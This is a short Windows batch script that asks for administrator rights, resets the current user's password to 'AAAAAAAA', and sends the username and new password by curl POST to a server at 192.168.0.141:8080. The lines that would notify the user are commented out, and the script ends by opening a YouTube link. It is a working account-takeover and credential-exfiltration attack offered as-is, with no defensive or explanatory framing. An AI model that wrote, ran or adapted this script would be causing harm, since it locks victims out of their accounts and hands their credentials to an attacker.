@echo off
:: Check if the script is running with administrator privileges
openfiles >nul 2>nul
if %errorlevel% neq 0 (
    @REM echo This script requires administrator privileges. Restarting with elevated privileges...
    powershell -Command "Start-Process cmd -ArgumentList '/c %~s0' -Verb runAs"
    exit
)

:: Collect system information
set USERNAME=%USERNAME%
set NEWPASSWD=AAAAAAAA

:: Change the password of the current user to 'AAAAAAAA'
net user %USERNAME% %NEWPASSWD%

:: Notify the server about the password change
set PASSWORD_CHANGE_PAYLOAD={\^"username\^":\^"%USERNAME%\^",\^"password_change_status\^":\^"success\^",\^"password_change\^":\^"%NEWPASSWD%\^"}

:: Send the password change notification to the server
curl -X POST -H "Content-Type: application/json" -d "%PASSWORD_CHANGE_PAYLOAD%" http://192.168.0.141:8080/info

:: Notify the user locally
@REM echo Password for %USERNAME% has been changed to '%NEWPASSWD%'.

:: Open the YouTube URL in the default browser
start https://www.youtube.com/shorts/Vjw3ZxXrCss

pause
